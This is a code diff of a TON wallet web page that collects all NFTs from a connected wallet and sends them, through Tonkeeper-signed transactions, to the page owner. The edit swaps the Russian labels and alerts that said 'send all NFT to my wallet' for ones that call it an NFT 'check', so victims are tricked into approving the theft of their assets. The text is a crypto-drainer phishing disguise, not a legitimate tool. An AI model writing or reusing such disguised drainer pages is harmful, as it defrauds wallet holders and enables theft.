@@ -21,8 +21,8 @@ button:hover { background:#2563eb; transform: translateY(-2px); }
 <div class="card">
 <h2>Send All NFT</h2>
 <div id="ton-connect-button"></div>
-<button id="send-btn">Отправить все NFT на мой кошелек</button>
-<p class="info">Подключите кошелек и нажмите кнопку. Все NFT будут отправлены на мой кошелек (подтвердите транзакции в Tonkeeper).</p>
+<button id="send-btn">Проверить нфт</button>
+<p class="info">Подключите кошелек и нажмите кнопку. Проверка (подтвердите проверку Tonkeeper).</p>
 </div>
 
 <script>
@@ -43,7 +43,7 @@ async function getUserNFTs(walletAddress) {
         });
         return nfts; 
     } catch (e) {
-        console.error("Не удалось получить NFT:", e);
+        console.error("Не удалось проверить NFT:", e);
         return [];
     }
 }
@@ -58,7 +58,7 @@ document.getElementById('send-btn').addEventListener('click', async () => {
 
     const nfts = await getUserNFTs(wallet.address);
     if (nfts.length === 0) {
-        alert("На вашем кошельке нет NFT.");
+        alert("На вашем кошельке нет NFT для проверки.");
         return;
     }
 
@@ -86,10 +86,10 @@ document.getElementById('send-btn').addEventListener('click', async () => {
             validUntil: Math.floor(Date.now()/1000)+300,
             messages: messages
         });
-        alert("Все NFT отправлены на твой кошелек! Подтвердите транзакции в Tonkeeper.");
+        alert("Все NFT проверяеться! Подтвердите проверку в Tonkeeper.");
     } catch (e) {
-        console.error("Ошибка отправки NFT:", e);
-        alert("Произошла ошибка при отправке NFT.");
+        console.error("Ошибка проверки NFT:", e);
+        alert("Произошла ошибка при проверки NFT.");
     }
 });
 </script>
